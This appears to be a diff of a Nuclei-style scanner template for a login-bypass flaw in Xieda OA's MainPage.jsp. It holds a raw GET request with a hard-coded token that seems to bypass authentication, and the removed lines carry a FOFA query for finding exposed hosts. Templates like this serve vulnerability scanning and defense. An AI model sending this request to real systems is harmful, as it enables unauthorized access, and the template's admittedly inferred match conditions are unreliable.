@@ -3,14 +3,8 @@ info:
   name: 协达OA的MainPage接口存在绕过验证登陆漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/377884986ebfce4e4e61d76aff8fec6a
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 377884986ebfce4e4e61d76aff8fec6a
-    fofa: + fofa`body="/interface/CheckLoginName.jsp"`
 http:
 - raw:
   - 'GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1
